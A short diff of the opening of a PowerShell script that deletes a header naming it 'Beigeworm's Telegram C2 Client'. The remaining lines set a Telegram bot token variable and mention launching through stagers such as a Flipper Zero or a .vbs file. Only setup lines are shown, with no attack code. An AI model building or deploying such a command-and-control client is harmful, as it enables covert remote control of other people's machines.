@@ -1,9 +1,3 @@
-<# ============================================= Beigeworm's Telegram C2 Client ========================================================
-<# Some more random lines
-Nonsense
-Nothing
-Bullshit
-#>
 # ---------------------------------------------- SCRIPT SETUP -----------------------------------------------
 # Define Connection Variables
 $Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
